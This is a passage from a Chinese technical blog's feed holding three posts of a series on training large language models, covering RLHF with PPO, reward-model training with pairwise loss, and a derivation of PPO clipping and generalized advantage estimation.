schedulers<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="训练效果"><a href="#训练效果" class="headerlink" title="训练效果"></a>训练效果</h3><p>在训练过程中，我们重点监控两个指标：KL 散度（KL/mean）和平均奖励（Reward/mean），用于衡量模型策略的变化幅度与优化方向的有效性。</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/0493dec9-acb4-4de8-a1bf-7035ad028a5f.png" style="zoom:30%;" /></p><p>上图展示的是当前策略与参考模型之间的 KL 散度，反映了两者在生成策略上的偏离程度。可以看到，KL 值在训练初期迅速上升，约在第 1000 步左右达到峰值后逐渐回落。这种趋势是 PPO 训练中的典型现象，表明策略开始收敛，更新变得更加稳定。同时，KL 惩罚项有效抑制了策略的大幅漂移，防止了训练过程中的策略崩坏。</p><p>而下图记录了模型在训练过程中的平均奖励（Reward/mean）变化情况。可以看到，Reward 在初始阶段整体为负，说明模型生成的响应尚未获得足够的正向反馈。随着训练推进，Reward 曲线逐步上升，说明模型输出越来越符合 Reward Model 的偏好。</p><p>不过，在写这篇博客时，训练才进行了不到五分之一，因此这里仅展示了训练早期的指标变化趋势。从现有的趋势来看，训练整体进展比较稳定。</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/434eb7c3-f1a9-4c51-a62d-5b56a7608db3.png" style="zoom:50%;" /></p><p><img src="https://blogfiles.oss.fyz666.xyz/png/ad26c930-4738-4b08-813a-a44b0d472fe4.png" style="zoom:50%;" /></p><p>从一些例子也可以看出，模型在面对这种问题时，已经倾向于给出更加符合人类偏好的回答。对于带有诱导性或存在争议的问题，模型不再简单地照单全收，而是能适度表达拒答、提醒或提出更中立的观点。这种行为变化正是 RLHF 带来的对齐效果：通过奖励信号引导模型学习价值导向明确、语用更恰当的响应策略。</p><p>训练代码见<a href="https://github.com/windshadow233/tiny-llm-training/blob/main/rlhf.py">此文件</a>。比较奇怪的是，训练最开始几个迭代，模型在推理时有时会遇到下面这种报错：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>pytorch<span class="token operator">/</span>aten<span class="token operator">/</span>src<span class="token operator">/</span>ATen<span class="token operator">/</span>native<span class="token operator">/</span>cuda<span class="token operator">/</span>TensorCompare<span class="token punctuation">.</span>cu<span class="token punctuation">:</span><span class="token number">112</span><span class="token punctuation">:</span> _assert_async_cuda_kernel<span class="token punctuation">:</span> block<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> thread<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span> Assertion `probability tensor contains either `inf`<span class="token punctuation">,</span> `nan` <span class="token keyword">or</span> element <span class="token operator">&lt;</span> <span class="token number">0</span>` failed<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>初步怀疑可能是数据类型（float16）的问题，不过训练跑起来以后就不影响了。</p><hr><p>至此，我们已经粗略复现了RLHF训练流程，训练也产生了一定的效果，模型在处理敏感或主观性问题时，已有了更加稳妥和人类偏好的回应倾向。然而，我们也注意到了，PPO算法也存在着明显的局限性：</p><ol><li>训练过程复杂：PPO算法需要多阶段训练模型，且流程繁琐。</li><li>显存占用较多：PPO算法训练过程中需要多个模型相互配合，如果将它们都放在CUDA上，则会占用非常多的显存，对硬件配置要求较大。</li><li>训练稳定性较差：PPO算法的训练过程对参数十分敏感，超参数若设置不当，训练容易崩盘。</li></ol><p>因此，事实上目前这个算法在工程上已经很少使用了，相关领域开始转向更简洁、高效的替代方法。博主也将逐步尝试这些新范式的实现，后续会在博客中持续更新其他更好的算法的原理与实践过程。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;如前文所述，在经过指令监督微调后，模型已具备初步的指令对齐能力。换言之，它不再只是一个简单的“续写模型”，而能够根据我们提供的指令，生成比较“对题”的响应。为了进一步提升模型的响应质量，以对齐人类偏好，我们还需要用到&lt;strong&gt;基于人类反馈的强化学习（RLHF）&lt;/st</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="机器学习" scheme="https://blog.fyz666.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://blog.fyz666.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="强化学习" scheme="https://blog.fyz666.xyz/tags/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="RLHF" scheme="https://blog.fyz666.xyz/tags/rlhf/"/>
    
  </entry>
  
  <entry>
    <title>大语言模型训练原理与实践（四）：Reward Model</title>
    <link href="https://blog.fyz666.xyz/blog/12760/"/>
    <id>https://blog.fyz666.xyz/blog/12760/</id>
    <published>2025-06-26T01:01:16.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<p>在<a href="/blog/12706/">上一篇文章</a>中，博主已经简单介绍了 PPO（Proximal Policy Optimization）算法的核心原理。然而，要让算法发挥效果，我们还需要一个关键模块：<strong>Reward Model（奖励模型）</strong>。这个模型负责为不同的输出生成打分，也就是我们在 PPO 优化目标中多次出现的那个 <script type="math/tex">R_i</script>。换句话说，Reward Model 就是大语言模型训练过程中的“裁判”——它不直接参与回答问题，但会评判哪个回答更符合人类的偏好，从而引导策略模型不断优化生成质量。</p><h2 id="模型结构"><a href="#模型结构" class="headerlink" title="模型结构"></a>模型结构</h2><p>Reward Model 有两种主流的形式：</p><ul><li>ORM（Outcome Reward Model）：对序列整体生成一个得分。</li><li>PRM（Process Reward Model）：在序列的生成过程中，分多个步骤，对每一步分别进行打分。</li></ul><p>考虑到训练的模型比较简单，我们采用ORM的形式。</p><p>Reward Model作为一个为语言模型的生成结果打分的模型，自然需要一定的语言能力，因此通常会选择与策略网络相同架构的语言模型，作为Reward Model的backbone。但与策略网络不同的一点是，Reward Model不输出token序列的概率分布，而是对整个输入序列计算一个标量，作为序列得分，用于评估序列的质量。</p><p>具体而言，我们的做法是在backbone的最后接上一个<strong>回归头（Regression Head）</strong>，通常它只是一个简单的线性层，以backbone输出的最后一个token的最后一层隐藏状态作为输入，并输出一个标量值作为Reward。</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/6c610ad5-7fbb-4262-a6b9-e0331b163e4a.webp" style="zoom:50%;" /></p><p>另外还有一种被称为<strong>Token-Level Reward Model</strong>的评估方案，一看就知道，是对句子中的每一个token计算得到上面的标量值。我在训练时采用的就是这种方案。</p><h2 id="数据-amp-训练方法"><a href="#数据-amp-训练方法" class="headerlink" title="数据 &amp; 训练方法"></a>数据 &amp; 训练方法</h2><p>数据准备方面，常见的数据格式是针对每一条prompt，准备两个候选回答，并标注哪个回答更符合人类偏好。一种典型的输入格式如下表所示：</p><div class="table-container"><table><thead><tr><th>prompt</th><th>chosen</th><th>rejected</th></tr></thead><tbody><tr><td>挖掘机技术哪家强？</td><td>中国山东找蓝翔！</td><td>我觉得我最强，因为我玩过模拟城市，里面开过挖掘机。</td></tr><tr><td>请以蔡徐坤的风格做一段自我介绍。</td><td>全民制作人们大家好，我是练习时长两年半的个人练习生蔡徐坤，喜欢唱、跳、rap、篮球，music！</td><td>大家好，我是蔡徐坤，一名知名的中国艺人。我热爱我的事业，也希望在未来为观众带来更多优秀的作品。谢谢大家的支持。</td></tr></tbody></table></div><p>在训练时，我们仍然将数据拼接为与前面训练SFT时的相同格式，即：<code>prompt_ids + bos_token_id + response_ids + eos_token_id</code>，不过这里存在两条不同的<code>response</code>，因此每条数据最终会生成两条序列数据。</p><p>我们将两条序列数据分别经过Reward Model的backbone，再将其最后一层隐藏状态作为回归头的输入，最终得到两个得分序列，记为 <code>v_chosen</code>和<code>v_rejected</code>。</p><p>然后我们逐token计算两个序列的得分之差：<code>v_chosen - v_rejected</code>。</p><p>最终，我们按下面方式进行计算得到两个序列的Pair-Wise Loss：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">loss <span class="token operator">=</span> <span class="token operator">-</span>F<span class="token punctuation">.</span>logsigmoid<span class="token punctuation">(</span>v_chosen <span class="token operator">-</span> v_rejected<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>为了保证训练稳定性与泛化能力，我们在训练 Reward Model 时通常<strong>不对整个模型进行微调</strong>，而是采取<strong>参数冻结+局部调整</strong>的方式，具体而言，我们会将backbone模型的参数冻结，而仅对回归头进行训练。在数据集规模较大的时候，也会在backbone中插入少量LoRA层进行微调，在保证训练稳定性的同时适当增强模型的理解能力。</p><p>在我的训练实践中，采用了第一种手段，即只训练回归头。</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/7dbbd802-e1f0-475c-8249-7c7c34ab7e37.webp" alt="51095708-0266-4898-8437-0ee2649cfa2e" style="zoom:50%;" /></p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/7f1b3a77-5d59-439d-8119-e5a8298be83a.webp" style="zoom:50%;" /></p><p>可以看到随着训练的进行，两种回复得到的Reward差距也有了明显提升。</p><hr><p>本文涉及到的训练代码详见下面仓库：</p><a class="tag-Link" target="_blank" href=" https://github.com/windshadow233/tiny-llm-training">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">tiny-llm-training</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><ul><li>数据集文件：<a href="https://github.com/windshadow233/tiny-llm-training/blob/main/RM/dataset.py">RM/dataset.py</a></li><li>模型文件：<a href="https://github.com/windshadow233/tiny-llm-training/blob/main/RM/model.py">RM/model.py</a></li><li>训练文件：<a href="https://github.com/windshadow233/tiny-llm-training/blob/main/rm_training.py">rm_training.py</a></li></ul><p>到了这里，我们就已经把 RLHF 中的关键角色、主要算法介绍完了。<a href="/blog/12778/">下一篇文章</a>，我们将进入大模型训练的最后一块拼图：RLHF，看看它是怎么把这些角色串联起来、协同合作，让大模型更贴近人类偏好。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;在&lt;a href=&quot;/blog/12706/&quot;&gt;上一篇文章&lt;/a&gt;中，博主已经简单介绍了 PPO（Proximal Policy Optimization）算法的核心原理。然而，要让算法发挥效果，我们还需要一个关键模块：&lt;strong&gt;Reward</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="机器学习" scheme="https://blog.fyz666.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://blog.fyz666.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="强化学习" scheme="https://blog.fyz666.xyz/tags/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="Reward Model" scheme="https://blog.fyz666.xyz/tags/reward-model/"/>
    
  </entry>
  
  <entry>
    <title>大语言模型训练原理与实践（三）：PPO算法</title>
    <link href="https://blog.fyz666.xyz/blog/12706/"/>
    <id>https://blog.fyz666.xyz/blog/12706/</id>
    <published>2025-06-24T05:01:20.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<p>在大语言模型的训练流程中，通常会先经过预训练和监督微调，经过这两个步骤后，模型已经能够理解语言结构，也能掌握基本的知识和指令执行能力，但你可能会发现，模型有时候仍会胡说八道、答非所问——这是由于监督微调出来的模型还不够聪明，它只是单纯能模仿人类已经写好的答案，但并不明白什么样的回答是「好的」（更符合人类偏好）。说白了，模型在监督微调阶段学的是<strong>「怎么答」</strong>，但没学会<strong>「怎么才能答得好」</strong>。</p><p>为了进一步提升模型输出的质量和对齐程度，研究者引入了<strong>基于人类反馈的强化学习（RLHF）</strong>。通过奖励模型对不同响应进行偏好打分，再利用强化学习算法对语言模型进行微调，使其在生成文本时更加贴合人类价值与偏好。其中，<strong>PPO（Proximal Policy Optimization）</strong> 是 RLHF 阶段最常用的优化算法，也是在 InstructGPT 和 ChatGPT 等模型中取得显著效果的关键技术。</p><p>本文将先从这个PPO算法入手，拆解此算法的核心理论。</p><hr><h2 id="策略梯度算法"><a href="#策略梯度算法" class="headerlink" title="策略梯度算法"></a>策略梯度算法</h2><p>PPO算法是一种<strong>On-Policy</strong>的<strong>策略梯度算法</strong>，关于策略梯度，我在<a href="/blog/12633/">之前的一篇文章</a>中曾提到过其核心公式的推导：</p><script type="math/tex; mode=display">\nabla_\theta J(\theta)=\mathbb{E}_{s\in S}\mathbb{E}_{a_t\sim\pi_\theta(*\mid s)}[\nabla_\theta(\log{\pi_\theta(a_t\mid s)})Q(s,a_t)]</script><p>这里 <script type="math/tex">J(\theta)=\mathbb{E}_{s\in S}[V_{\pi_\theta}(s)]</script> 表示采取 以 <script type="math/tex">\theta</script> 为参数的动作策略 <script type="math/tex">\pi_\theta</script>​ 时，能获得的所有状态下的回报的期望值。</p><p>简单来说，我们希望优化 <script type="math/tex">\theta</script>，让 <script type="math/tex">J(\theta)</script> 变得更大。但策略梯度算法在实际应用时极不稳定，这种更新的方法容易让策略变化太剧烈，尤其是对于像大语言模型这样参数量巨大的网络（也算一种策略网络）而言，更是难以承受。为了引入对策略变化的约束，后续又提出了一些新的方法，例如<strong>TRPO</strong>、<strong>PPO</strong>等，前者直接在训练时强行限制新旧策略之间的KL散度，而后者则提出了一种更简单并且非常有效的手段。</p><p>我这里也以一个简单的小游戏：flappy bird，为具体的例子，对PPO算法进行了一个简单的实践。</p><a class="tag-Link" target="_blank" href=" https://github.com/windshadow233/flappy-bird-ppo/">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">flappy-bird-ppo</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><h2 id="PPO算法"><a href="#PPO算法" class="headerlink" title="PPO算法"></a>PPO算法</h2><p>我们回到 <script type="math/tex">J(\theta)</script> 期望内部的 <script type="math/tex">V</script> 函数的定义：</p><script type="math/tex; mode=display">V_{\pi_\theta}(s_t)=\mathbb{E}_{a_t\sim\pi_\theta(*\mid s_t)}[Q(s_t,a_t)]</script><p>我们要最大化 <script type="math/tex">J(\theta)</script>，其实就相当于最大化 <script type="math/tex">V</script> 函数： </p><script type="math/tex; mode=display">\max_{\theta} V_{\pi_\theta}(s_t),\forall s_t</script><p>将 <script type="math/tex">V</script> 函数中的期望展开为积分：</p><script type="math/tex; mode=display">\max_{\theta} \int_{a\in A}\pi_\theta(a\mid s_t)Q(s_t,a)</script><p>我们发现，在给定状态 <script type="math/tex">s_t</script> 的情况下，<script type="math/tex">Q(s_t,a)</script> 为关于动作 <script type="math/tex">a</script> 的单变量函数，此时有两种情况：</p><ol><li><script type="math/tex">Q(s_t,a)>0</script>，说明它给我们带来的价值是正的，意味着这是一个比较好的动作，我们就应该<strong>进一步提升</strong>当前状态下这个动作被取到的概率，也就是 <script type="math/tex">\pi_\theta(a\mid s_t)</script> 的值。</li><li><script type="math/tex">Q(s_t,a)\le 0</script>​​，说明它没有给我们带来价值或带来了负价值，意味着这个动作比较差，同理我们应该<strong>进一步降低</strong>当前状态下这个动作被取到的概率。</li></ol><h3 id="重要性采样"><a href="#重要性采样" class="headerlink" title="重要性采样"></a>重要性采样</h3><p>对于上面的两种情况，我们实际上不关心当前动作概率具体的值是多少，而更关心是否要将此概率进一步提升或降低，那么很自然地会想到，可以将优化前后的概率值做一个比值：</p><script type="math/tex; mode=display">\frac{\pi_\theta(a\mid s_t)_{\text{new}}}{\pi_\theta(a\mid s_t)_{\text{old}}}</script><p>我们可以<strong>固定分母，优化分子</strong>，同时这个值还可以体现新概率相对于旧概率的变化。</p><p>对于情况 1，我们希望新概率变大，故需要对 <script type="math/tex">\pi_\theta(a\mid s_t)_{\text{new}}</script> 梯度上升；对于情况 2，我们希望新概率变小，故需要对 <script type="math/tex">\pi_\theta(a\mid s_t)_{\text{new}}</script> 梯度下降。合而为一，我们总是需要对下式：</p><script type="math/tex; mode=display">\frac{\pi_\theta(a\mid s_t)_{\text{new}}}{\pi_\theta(a\mid s_t)_{\text{old}}}Q(s_t\mid a)</script><p>进行梯度上升。</p><p>这就将原先的优化目标转化为了：</p><script type="math/tex; mode=display">\max_{\theta} \int_{a\in A}\frac{\pi_\theta(a\mid s_t)_{\text{new}}}{\pi_\theta(a\mid s_t)_{\text{old}}}Q(s_t,a)</script><p>这个操作也被称为<strong>重要性采样</strong>。</p><h3 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h3><p>回想策略梯度算法的缺陷：难以在优化过程中控制新旧策略的差异，导致策略剧烈波动，使得训练不稳定。</p><p>在经过了<strong>重要性采样</strong>以后，如何规避这个缺陷？</p><p>盯着<strong>重要性采样</strong>引出的优化目标看，这不答案已经拍脸上了吗？直接约束新旧概率之间的差距不就行了？</p><p>对于这件事，<strong>PPO</strong>算法使用的约束方法是对新旧概率的比值，也就是优化目标左边那一坨东西，进行一个裁剪：</p><script type="math/tex; mode=display">\text{clip}(\frac{\pi_\theta(a\mid s_t)_{\text{new}}}{\pi_\theta(a\mid s_t)_{\text{old}}}, 1-\epsilon,1+\epsilon)</script><p>将概率的比值保持在区间 <script type="math/tex">[1-\epsilon, 1+\epsilon]</script>​​​ 之内，简单粗暴地控制了策略的差异。由于<code>clip</code>在区间外不产生梯度，这个操作使得与原策略差距过大的动作不会让模型产生参数更新。让策略模型在训练过程中能够逐步收敛，不至于在一次更新中产生过大的变化。</p><hr><p>另外，在大语言模型的训练中，我们还要对新策略和原始策略之间的KL散度进行惩罚，这同样也是为了防止新策略跑的离旧策略太远。计算KL散度有多种方式，这里暂时不管。</p><h3 id="优势函数"><a href="#优势函数" class="headerlink" title="优势函数"></a>优势函数</h3><p>设想我们的 Agent 因为<del>前面操作太垃</del>种种原因，处在一个已经非常糟糕的状态 <script type="math/tex">s_t</script> ，这个状态下，无论这个 Agent 采取哪个动作 <script type="math/tex">a</script>，价值函数 <script type="math/tex">Q(a\mid s_t)</script>​ 都是负的，由刚刚<strong>重要性采样</strong>部分得出的结论，我们发现对于每个动作都要降低它被取到的概率，<del>这不就是摆烂么</del>。难道对于 Agent 而言，原地摆烂才是最优解？</p><p><img src="https://blogfiles.oss.fyz666.xyz/webp/59c510e5-7883-406e-8d8a-e95798bc9cd5.webp" alt=""></p><p>恐怕大部分心理承受能力比较普通的人类玩家面对这种情况都会选择<del>战术性摊手</del>摆烂吧。</p><p><img src="https://blogfiles.oss.fyz666.xyz/gif/7f204236-0f9f-4149-b196-5adf6ac9300c.gif" alt=""></p><p>但 Agent 毕竟不是情绪化的玩家。作为没有任何感情的 Bot，它应该做的绝对不是摆烂，而是在逆境中找到那一记也许能够力挽狂澜的神之一手，无论最终结局如何。</p><p>从强化学习的角度来看，我们先前优化目标中的 <script type="math/tex">Q</script> 函数就显得不够合理了，因此需要找出一个新的函数来代替 <script type="math/tex">Q</script>​ 函数，其能够更准确地衡量某一个动作在当前局势下的优劣程度。</p><p>这便是<strong>优势函数</strong>。</p><p>我们定义 <script type="math/tex">s_t</script> 状态下，采取动作 <script type="math/tex">a</script> 的优势函数如下：</p><script type="math/tex; mode=display">A(s_t,a)=Q(s_t,a) - V_{\pi_\theta}(s_t)</script><p>也就是采取了 动作 <script type="math/tex">a</script> 以后，能得到的预期回报与<strong>「遵循策略时能带来的预期回报的期望」</strong>之差。</p><p>说白了就是衡量你这个动作能让局势改善多少。如果有所改善，说明该动作是比原策略更优的，我们要增大这个动作的概率，反之亦然。</p><p>于是我们的优化目标变为了：</p><script type="math/tex; mode=display">\max_{\theta} \int_{a\in A}\text{clip}(\frac{\pi_\theta(a\mid s_t)_{\text{new}}}{\pi_\theta(a\mid s_t)_{\text{old}}}, 1-\epsilon,1+\epsilon)A(s_t,a)</script><p>不过这个优化目标还并不完整，直接使用这个函数进行梯度上升仍有一定问题，且看下文。</p><h3 id="最终的目标函数"><a href="#最终的目标函数" class="headerlink" title="最终的目标函数"></a>最终的目标函数</h3><p>前文提到的目标函数存在一定的问题，因此在实际的应用中，还需要对优化目标进行以下 <script type="math/tex">\min</script> 计算：</p><p>方便起见，定义 <script type="math/tex">r \overset{\triangle}{=} \frac{\pi_\theta(a\mid s_t)_{\text{new}}}{\pi_\theta(a\mid s_t)_{\text{old}}}</script>​，则 PPO 算法最终的优化目标如下：</p><script type="math/tex; mode=display">\max_{\theta} \int_{a\in A}\min\{\text{clip}(r, 1-\epsilon,1+\epsilon)A(s_t,a),\ r A(s_t,a)\}</script><p>对于这个操作，可能有一些初学者会有疑惑：<strong>已经<code>clip</code>了为什么还要取<code>min</code></strong>？这一点许多其他博客都没有提到，其实可以简单分析一下如果不取<code>min</code>会发生什么预想之外的事：</p><ol><li><p>第一种情况：<script type="math/tex">A(s_t,a)>0</script> 时，此时这个动作是好的动作，因此需要把动作概率向上调整。此时又分为三种情况：</p><ul><li><p><script type="math/tex">r\ge1+\epsilon</script>：此时，优化目标会把 <script type="math/tex">r</script> 进行一个 <code>clip</code>，变成 <script type="math/tex">1+\epsilon</script>，此时由于<code>clip</code>函数在阈值外不产生梯度，优化目标就不会对策略网络产生梯度累积，这意味着这个<strong>概率过大</strong>的动作<strong>不再</strong>被用于参数的更新，这是<strong>合理</strong>的。</p></li><li><p><script type="math/tex">1+\epsilon>r>1-\epsilon</script>：此时不截断，正常计算梯度，正常更新策略网络参数，也非常<strong>合理</strong>。</p></li><li><p><script type="math/tex">r\le1-\epsilon</script>​：此时，与前面第一条子情况同理，由于产生了截断，优化目标同样不会对策略网络产生梯度累积，意味着这个<strong>概率过小</strong>的动作也没有被用于网络参数的更新，但这是<strong>不合理</strong>的：因为我们本应该将这个动作的概率调大。</p></li></ul></li><li>第二种情况：<script type="math/tex">A(s_t,a)\le0</script> 时，与第一种情况同理，我们会发现对于 <script type="math/tex">r\ge1+\epsilon</script>​ 的动作，将由于<code>clip</code>运算阻断了梯度，从而不参与网络参数的更新，这同样是<strong>不合理</strong>的。</li></ol><p>对于上述没有取 <code>min</code> 运算的情况，有几条不合理性，而这些不合理都可以通过做<code>min</code>运算得到解决。我们同样分类讨论：</p><ol><li><p><script type="math/tex">A(s_t,a)>0</script> 时，需要把动作概率向上调整，此时若：</p><ul><li><script type="math/tex">r\ge1+\epsilon</script>：取 <code>min</code> 运算后，得到的是截断后的值，故梯度反馈为0，不更新参数，非常<strong>合理</strong>。</li><li><script type="math/tex">1+\epsilon>r>1-\epsilon</script>：<code>min</code> 运算不产生效果，正常计算梯度，更新参数，非常<strong>合理</strong>。</li><li><script type="math/tex">r\le1-\epsilon</script>：<code>min</code> 运算后，得到的是未被截断的值，故梯度反馈不为0，能够正常更新参数，非常<strong>合理</strong>。</li></ul></li><li><p><script type="math/tex">A(s_t,a)\le0</script> 时，需要注意此时 <code>min</code> 运算作用在两个负数上，故会得到与前面相反的结果，即对于<script type="math/tex">r\ge1+\epsilon</script> 的动作，进行了<code>min</code> 运算后得到的反而是未被截断的值，故这种情况下仍能够正常更新参数，也变得<strong>合理</strong>了起来！</p></li></ol><p>因此，这个取<code>min</code>运算是非常重要的，如果没有这个运算，在某些情况下参数会得不到我们希望的更新。</p><h3 id="如何估计优势函数"><a href="#如何估计优势函数" class="headerlink" title="如何估计优势函数"></a>如何估计优势函数</h3><p>优势函数这个东西看上去十分抽象，要怎么去估计呢？</p><p>为方便起见，我们记 <script type="math/tex">A_t^{(k)}</script> 为 <script type="math/tex">A(s_t)</script> 的 <script type="math/tex">k</script> 阶近似估计，<script type="math/tex">Q_t^{(k)}</script> 为 <script type="math/tex">Q(s_t,a)</script> 的 <script type="math/tex">k</script> 阶近似估计，<script type="math/tex">V_t\overset{\triangle}{=}V_{\pi_\theta}(s_t)</script> ，写出 <script type="math/tex">t</script> 时刻优势函数的 1 阶近似估计：</p><script type="math/tex; mode=display">A_t^{(1)}=\underbrace{R_t + \gamma V_{t+1}}_{Q_t^{(1)}} - V_t</script><p>我们发现，它正好相当于 <script type="math/tex">t</script> 时刻的TD残差 <script type="math/tex">\delta_t</script>。</p><p>同理，2 阶近似估计：</p><script type="math/tex; mode=display">A_{t}^{(2)}=\underbrace{R_t+\gamma R_{t+1}+\gamma^2V_{t+2}}_{Q_{t}^{(2)}}-V_t</script><p>将其做一些变换，得到：</p><script type="math/tex; mode=display">\begin{aligned}A_{t}^{(2)}&=(R_t+\gamma V_{t+1}-V_t)+(\gamma R_{t+1}+\gamma^2V_{t+2}-\gamma V_{t+1})\\&=\delta_t + \gamma\delta_{t+1}\end{aligned}</script><p>同理，我们也可以写出 <script type="math/tex">k</script> 阶近似估计的通项：</p><script type="math/tex; mode=display">A_{t}^{(k)}=\underbrace{(\sum_{i=0}^{k-1}\gamma^iR_{t+i})+\gamma^kV_{t+k}}_{Q_{t}^{(k)}}-V_t</script><p>同样可以将上式变成：</p><script type="math/tex; mode=display">A_{t}^{(k)}=\sum_{l=0}^{k-1}\gamma^l\delta_{t+l}</script><p>恰好是TD残差 <script type="math/tex">\delta</script> 序列的带衰减累计求和。</p><p>近似阶数 <script type="math/tex">k</script> 越大，我们得到的估计值的<strong>偏差越小</strong>，但其中包含的随机变量（<script type="math/tex">\{R_{t+i}\ \mid  \ i=0,\dots,k-1\}</script>）越多，因此<strong>方差反而变大</strong>。</p><p>接下来有个操作叫 <strong><script type="math/tex">\lambda-\text{return}</script></strong> 算法，它的作用是平衡这些估计的偏差与方差。</p><p>简而言之，该方法使用一个 <script type="math/tex">(0,1)</script> 上的系数 <script type="math/tex">\lambda</script> ，对这些估计进行加权求和，即：</p><script type="math/tex; mode=display">\sum_{i=1}^\infty\lambda^{i-1}A_t^{(i)}</script><p>阶数越高的估计值，权重越小，以此降低其方差。由此得到的和式能够兼顾偏差和方差。</p><p>由于所有的 <script type="math/tex">A_t^{(i)}</script> 都是 <script type="math/tex">A_t</script> 的估计，上式的期望差不多相当于 <script type="math/tex">\frac{1}{1-\lambda}A_t</script>, 因此我们还应该乘上一个系数 <script type="math/tex">1-\lambda</script>，才能得到真正对 <script type="math/tex">A_t</script> 的估计：</p><script type="math/tex; mode=display">\begin{aligned}\hat{A_t}&=(1-\lambda)\sum_{i=1}^\infty\lambda^{i-1}A_t^{(i)}\\&=(1-\lambda)\sum_{i=1}^\infty\lambda^{i-1}\sum_{l=0}^{i-1}\gamma^l\delta_{t+l}\end{aligned}</script><p>这便是<strong>广义优势估计 (GAE) </strong>算法。</p><hr><p>对于PPO算法的基本原理就讲到这儿，接下来让我们来看看这个算法是如何应用在大语言模型的训练流程中的。为了让PPO能够发挥作用，我们还缺少一个模块，那就是用来计算上文中多次出现的 <script type="math/tex">R_i</script> 的值（Reward）的模型，也就是所谓 <strong>Reward Model</strong>，<a href="/blog/12760/">下一篇文章</a>，博主将介绍如何训练一个 Reward Model。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;在大语言模型的训练流程中，通常会先经过预训练和监督微调，经过这两个步骤后，模型已经能够理解语言结构，也能掌握基本的知识和指令执行能力，但你可能会发现，模型有时候仍会胡说八道、答非所问——这是由于监督微调出来的模型还不够聪明，它只是单纯能模仿人类已经写好的答案，但并不明白什么</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="大语言模型训练" scheme="https://blog.fyz666.xyz/categories/%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    
    
    <category term="机器学习" scheme="https://blog.fyz666.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="深度学习" scheme="https://blog.fyz666.xyz/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
